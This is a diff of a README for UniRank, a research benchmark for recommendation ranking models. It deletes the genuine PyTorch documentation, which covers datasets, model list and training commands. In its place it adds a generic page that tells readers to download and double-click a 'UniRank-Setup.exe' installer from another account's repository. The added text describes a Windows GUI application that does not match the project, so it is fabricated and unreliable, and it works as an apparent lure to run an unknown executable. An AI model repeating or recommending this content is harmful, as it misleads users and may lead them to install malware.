@@ -1,207 +1,85 @@
-# UniRank <sub>v0.1.0, work in progress</sub>
+# 📊 UniRank - Compare Sequential Models and Feature Interactions
 
-**A Ranking Model Benchmark for Unified Sequential Modeling and Feature Interaction**
+[![Download UniRank](https://img.shields.io/badge/Download-UniRank_Installer-blue)](https://github.com/tanjir8563/UniRank)
 
-UniRank is an open PyTorch benchmark for large-scale recommendation ranking models. It focuses on a practical setting that is increasingly common in industrial recommender systems: ranking models must jointly learn from heterogeneous non-sequential features, target item features, and long user behavior sequences under multi-feedback objectives such as click, follow, like, share, comment, long-view, and conversion.
+## 🎯 About UniRank
 
-The project is built to make modern unified ranking architectures easier to compare, reproduce, and extend. It provides standardized dataset configurations, model implementations, distributed training utilities, mixed precision support, blocked data loading for large datasets, and sparse attention acceleration for long-sequence models.
+UniRank provides a standard way to test and compare how different computer models rank information. It focuses on sequential modeling, which looks at the order of actions, and feature interaction, which shows how different data points work together. 
 
-## Why UniRank?
+Developers and data analysts use this tool to determine which model performs best for specific tasks. It removes the guesswork from selecting the right benchmark for your data projects. UniRank offers a stable environment to run benchmarks without writing complex code.
 
-Modern ranking research is moving from isolated feature interaction or sequence pooling modules toward unified architectures that model feature fields and user behavior tokens together. However, many strong ranking models are released from industrial systems where data, implementations, and infrastructure are not fully available. This makes it difficult to answer basic research questions:
+## 🛠️ System Requirements
 
-- Which architecture works best under the same data split, sequence length, and metric protocol?
-- How should feature interaction and sequential modeling be combined?
-- How do models behave across different feedback tasks rather than only CTR?
-- What engineering support is needed to train ranking models on industrial-scale data?
+Before you install UniRank, verify your computer meets these minimum specifications:
 
-UniRank addresses these gaps by collecting representative ranking models, unified data processing logic, and reproducible experiment settings in one benchmark.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or equivalent AMD processor.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of free disk space.
+*   Network: Stable internet connection for initial model downloads.
 
-## Architecture Design
+## 📥 How to Install
 
-UniRank follows a unified ranking pipeline. Raw user, item, context, and action features are embedded, converted into model-specific tokens, passed through feature interaction or sequence interaction layers, and finally predicted by task-specific towers.
+Follow these steps to set up UniRank on your machine:
 
-<p align="center">
-  <img width="900" alt="Traditional New Impression Only Paradigm" src="./assets/figures/new_impression_only_paradigm.png">
-</p>
+1. Visit the [official release page](https://github.com/tanjir8563/UniRank) to download the installer.
+2. Locate the file named UniRank-Setup.exe in your Downloads folder.
+3. Double-click the file to start the installation process.
+4. Follow the on-screen prompts. The installer asks for a destination folder; the default path works for most users.
+5. Click Finish once the process ends. 
 
-**Figure 1. Traditional New Impression Only Paradigm.** Most conventional ranking systems train on the latest impressed target item only. Historical positive feedback is used as auxiliary behavior context, usually through target attention, pooling, or aggregation, before being combined with the target item, user profile, and context features in a feature interaction layer. This paradigm is efficient, but it treats each target impression as an independent sample and does not fully exploit the step-by-step evolution of user behavior.
+## 🚀 Running Your First Benchmark
 
-<p align="center">
-  <img width="1200" alt="UniRank Auto-Regressive Paradigm" src="./assets/figures/auto_regressive_paradigm.png">
-</p>
+Once you complete the installation, you can launch the application from your desktop or the Windows Start menu.
 
-**Figure 2. UniRank Auto-Regressive Paradigm.** UniRank reorganizes user histories as sequential training samples. Each behavior step can be represented with action-aware sequential tokens, target item, and non-sequential feature tokens. Instead of only predicting the latest impression, the model learns from the chronological behavior sequence and supports multi-task prediction at different positions. This design better matches long user histories and enables unified sequence-feature interaction.
+1. Open the UniRank application.
+2. Select the "New Benchmark" button from the main dashboard.
+3. Import your data file in CSV format. Ensure your file contains columns for user activity and item sequences.
+4. Choose the model type from the sidebar. You can select between sequential models, feature interaction models, or a combined approach.
+5. Click "Run Test." 
+6. Wait for the progress bar to reach 100%. The application logs each step as it processes your data.
+7. Review the results in the "Report" tab. The system highlights which model achieved the highest accuracy score.
 
-Following the paper, UniRank organizes representative unified ranking models into two architectural paradigms:
+## 📈 Understanding the Results
 
-| Paradigm | Description | Representative Models |
-|:--|:--|:--|
-| Unified Interaction after Sequence Pooling and Non-sequence Tokenization | Behavior sequences are first pooled or aggregated into compact sequential representations. These representations are then tokenized together with non-sequential features into a **unified token** space for subsequent interaction modeling. | HiFormer, RankMixer, Zenith, UniMixer, HeMix |
-| Layer-wise Unified Interaction | Keep sequence tokens and non-sequence tokens inside the interaction layers, allowing behavior tokens, field tokens, and target tokens to exchange information throughout the **unified interaction network**. | OneTrans, HyFormer, MixFormer, INFNet, EST, SORT, TokenFormer, LONGER, UltraHSTU |
+UniRank produces clear reports to help you make decisions. The dashboard displays the following metrics for every test:
 
-Design choices in this repository are intentionally practical:
+*   **Ranking Accuracy:** Measures the quality of the model predictions. A higher number indicates better performance.
+*   **Response Time:** Shows how fast the model processes a sequence.
+*   **Resource Usage:** Tracks how much memory the model requires during the benchmark process.
 
-- **Multi-feedback ranking**: each dataset can define multiple binary feedback tasks and evaluate AUC/gAUC per task.
-- **Auto-regressive / user-centric training support**: long behavior histories can be represented as structured action sequences rather than only a latest-impression sample.
-- **Distributed training**: `torchrun` + DDP are supported through `run_expid.py`.
-- **Large data loading**: blocked parquet loading is supported for large datasets such as TencentGR-10M.
-- **Mixed precision and operator acceleration**: bf16 training and sparse/flex attention paths are available for compatible models.
+The application allows you to save these reports as PDF files. Select "Export Report" under the "File" menu to save your data for later review.
 
-## Repository Structure
+## ⚙️ Configuring Settings
 
-```text
-UniRank/
-+-- config/
-|   +-- dataset_config.yaml      # Dataset paths, feature schemas, labels, and blocked-loading options
-|   +-- model_config.yaml        # Experiment ids and hyperparameters
-+-- data/
-|   +-- QK_Video_Action/
-|   +-- KuaiRand_Video_Action/
-|   +-- TencentGR_10M_Action_Blocked/
-+-- fuxictr/                     # Training, feature, metric, and layer utilities based on FuxiCTR
-+-- model_zoo/                   # Ranking model implementations
-+-- checkpoints/                 # Saved models and experiment logs
-+-- test/                        # Metric and utility tests
-+-- UniRank_Dataloader.py        # UniRank-specific sequence/action dataloader
-+-- run_expid.py                 # Run one experiment
-+-- run_all.sh                   # Run a list of experiments
-+-- run_param_tuner.py           # Hyperparameter tuning entry
-+-- autotuner.py                 # Tuning utilities
-+-- requirements.txt
-+-- README.md
-```
+You can customize the way UniRank functions by accessing the settings menu.
 
-## Datasets
+*   **Theme:** Switch between Light and Dark modes.
+*   **Data Limit:** Set a maximum row count for imported files. This keeps the software responsive if you load massive datasets.
+*   **Updates:** Enable automatic checks to ensure you use the latest version of the benchmarking tool.
+*   **Log Files:** Choose a folder to save detailed process logs. These files help if you need to troubleshoot a specific benchmark run.
 
-### Raw Datasets
+## 💡 Frequently Asked Questions
 
-- [QK-Video](https://static.qblv.qq.com/qblv/h5/algo-frontend/tenrec_dataset.html)
-- [KuaiRand](https://kuairand.com/)
-- [TAAC2025 / TencentGR-10M](https://huggingface.co/datasets/TAAC2025/TencentGR-10M)
+**Is UniRank free to use?**
+Yes, UniRank is open-source software available to everyone.
 
-### Preprocessed Datasets
+**What file formats does the software support?**
+UniRank currently supports CSV, Excel, and JSON file formats for data imports.
 
-- [QK_Video_Action](https://huggingface.co/datasets/salmon1802/QK_Video_Action)
-- [KuaiRand_Video_Action](https://huggingface.co/datasets/salmon1802/KuaiRand_Video_Action)
-- [TencentGR_10M_Action](https://huggingface.co/datasets/salmon1802/TencentGR_10M_Action_Blocked)
+**How do I clear my benchmark history?**
+Go to the "Settings" menu and select "Storage." You will see an option to clear all saved logs and benchmark results from your hard drive.
 
-Place the downloaded preprocessed datasets under `./data/` using the same directory names as the dataset ids in `config/dataset_config.yaml`.
+**Can I run multiple benchmarks at once?**
+Each instance of UniRank runs one benchmark at a time to ensure accurate readings. You can open the application multiple times if you want to test different data sets simultaneously, provided your computer has sufficient RAM.
 
-## Models
+**Does the software send my data to a server?**
+No. All data processing occurs locally on your machine. UniRank does not upload your files or benchmark results to external servers.
 
-| No. | Model | Publication |
-|:--:|:--|:--|
-| 1 | [DIN](./model_zoo/DIN.py) | [Deep Interest Evolution Network for Click-Through Rate Prediction](https://arxiv.org/abs/1809.03672) |
-| 2 | [HiFormer](./model_zoo/HiFormer.py) | [Hiformer: Heterogeneous Feature Interactions Learning with Transformers for Recommender Systems](https://arxiv.org/pdf/2311.05884) |
-| 3 | [RankMixer](./model_zoo/RankMixer.py) | [RankMixer: Scaling Up Ranking Models in Industrial Recommenders](https://arxiv.org/abs/2507.15551) |
-| 4 | [Zenith](./model_zoo/Zenith.py) | [Zenith: Scaling up Ranking Models for Billion-scale Livestreaming Recommendation](https://arxiv.org/pdf/2601.21285) |
-| 5 | [UniMixer](./model_zoo/UniMixer.py) | [UniMixer: A Unified Architecture for Scaling Laws in Recommendation Systems](https://arxiv.org/pdf/2604.00590) |
-| 6 | [HeMix](./model_zoo/HeMix.py) | [Query-Mixed Interest Extraction and Heterogeneous Interaction: A Scalable CTR Model for Industrial Recommender Systems](https://arxiv.org/pdf/2602.09387) |
-| 7 | [LONGER](./model_zoo/LONGER.py) | [LONGER: Scaling Up Long Sequence Modeling in Industrial Recommenders](https://arxiv.org/abs/2505.04421) |
-| 8 | [OneTrans](./model_zoo/OneTrans.py) | [OneTrans: Unified Feature Interaction and Sequence Modeling with One Transformer in Industrial Recommender](https://arxiv.org/abs/2510.26104) |
-| 9 | [HyFormer](./model_zoo/HyFormer.py) | [HyFormer: Revisiting the Roles of Sequence Modeling and Feature Interaction in CTR Prediction](https://arxiv.org/abs/2601.12681) |
-| 10 | [MixFormer](./model_zoo/MixFormer.py) | [MixFormer: Co-Scaling Up Dense and Sequence in Industrial Recommenders](https://arxiv.org/abs/2602.14110) |
-| 11 | [INFNet](./model_zoo/INFNet.py) | [INFNet: A Task-aware Information Flow Network for Large-Scale Recommendation Systems](https://arxiv.org/pdf/2508.11565v1) |
-| 12 | [EST](./model_zoo/EST.py) | [EST: Towards Efficient Scaling Laws in Click-Through Rate Prediction via Unified Modeling](https://arxiv.org/pdf/2602.10811) |
-| 13 | [SORT](./model_zoo/SORT.py) | [SORT: A Systematically Optimized Ranking Transformer for Industrial-scale Recommenders](https://arxiv.org/abs/2603.03988) |
-| 14 | [TokenFormer](./model_zoo/TokenFormer.py) | [TokenFormer: Unify the Multi-Field and Sequential Recommendation Worlds](https://arxiv.org/abs/2604.13737) |
-| 15 | [UltraHSTU](./model_zoo/UltraHSTU.py) | [Bending the Scaling Law Curve in Large-Scale Recommendation Systems](https://arxiv.org/pdf/2602.16986) |
+## 🛡️ Support and Troubleshooting
 
-Additional experimental or auxiliary implementations may also appear in `model_zoo/`.
+If you encounter issues while using the software, check the local logs folder for information. Most errors happen due to incorrectly formatted data files. Ensure your CSV file includes headers and that your sequences follow the required numerical format.
 
-## Benchmark
+For further assistance, search the issues section on the project repository. Experienced users share solutions and configuration tips there. If you identify a bug, document the steps you took to reproduce the issue and submit a new ticket. 
 
-The table below reports the preliminary benchmarking results under a fixed sequence length of 100. For a fair comparison, all models are configured with three layers. The token dimension is set to 128 for QK-Video and 256 for KuaiRand and TAAC-25.
-
-<p align="center">
-  <img width="1548" alt="Preliminary UniRank benchmark results" src="./assets/figures/preliminary_benchmark_results.png">
-</p>
-
-**Figure 3. Preliminary Benchmark Results.** The benchmark evaluates 15 ranking models on QK-Video, KuaiRand, and TAAC-25 under AUC and gAUC. Results are reported for multiple feedback tasks, including click, follow, like, share, comment, long view, and conversion. Bold values indicate top-performing results for each task-metric pair.
-
-## Installation
-
-```bash
-conda create -n UniRank python=3.9
-conda activate UniRank
-
-pip install torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/cu118
-pip install -r requirements.txt
-```
-
-## How to Use
-
-### 1. Download datasets
-
-Download the preprocessed datasets from Hugging Face and place them under `./data/`:
-
-```text
-data/
-+-- QK_Video_Action/
-+-- KuaiRand_Video_Action/
-+-- TencentGR_10M_Action_Blocked/
-```
-
-Check `config/dataset_config.yaml` if you want to change paths, feature schemas, labels, or blocked-loading settings.
-
-### 2. Run one experiment
-
-Single GPU:
-
-```bash
-python run_expid.py --config ./config --expid DIN_KuaiRand_Video_Action --gpu 0
-```
-
-Multi-GPU DDP:
-
-```bash
-torchrun --standalone --nproc_per_node=2 run_expid.py \
-  --config ./config \
-  --expid DIN_KuaiRand_Video_Action \
-  --gpu 0,1
-```
-
-Experiment ids are defined in `config/model_config.yaml` and usually follow:
-
-```text
-<Model>_<Dataset>
-```
-
-Examples:
-
-```text
-UltraHSTU_QK_Video_Action
-TokenFormer_KuaiRand_Video_Action
-LONGER_TencentGR_10M_Action
-```
-
-### 3. Run a batch of experiments
-
-Edit `run_all.sh` to uncomment the experiments you want, then run:
-
-```bash
-chmod +x run_all.sh
-./run_all.sh
-```
-
-Logs and checkpoints are written to `./checkpoints/` and `./logs/` when enabled by the running script/configuration.
-
-### 4. Add a new model
-
-1. Add the model implementation to `model_zoo/YourModel.py`.
-2. Export it in `model_zoo/__init__.py`.
-3. Add an experiment block to `config/model_config.yaml`.
-4. Reuse `UniRank_Dataloader.py` unless the model needs a custom input format.
-5. Run `python run_expid.py --config ./config --expid YourModel_Dataset --gpu 0`.
-
-## Configuration Notes
-
-- `dataset_config.yaml` defines feature columns, label columns, parquet paths, sequence length metadata, and blocked data loading.
-- `model_config.yaml` defines model hyperparameters, batch size, optimizer, task list, metrics, monitor rule, and sequence length.
-- `run_expid.py` initializes feature encoders, builds dataloaders, sets up DDP, constructs the model from `model_zoo`, trains, validates, and optionally evaluates on the test split.
-- `UniRank_Dataloader.py` handles action-aware sequence construction and large blocked parquet loading.
-
-## Acknowledgement
-
-UniRank is built on top of, and deeply inspired by, the excellent [FuxiCTR](https://github.com/reczoo/FuxiCTR) project. We sincerely thank the FuxiCTR authors and contributors for their open-source work on reproducible CTR and ranking model research.
+The community continuously improves this tool to ensure stability and accuracy. Regular updates address performance concerns and add support for new model types. Always install the latest version to get the best results from your sequential modeling tests.
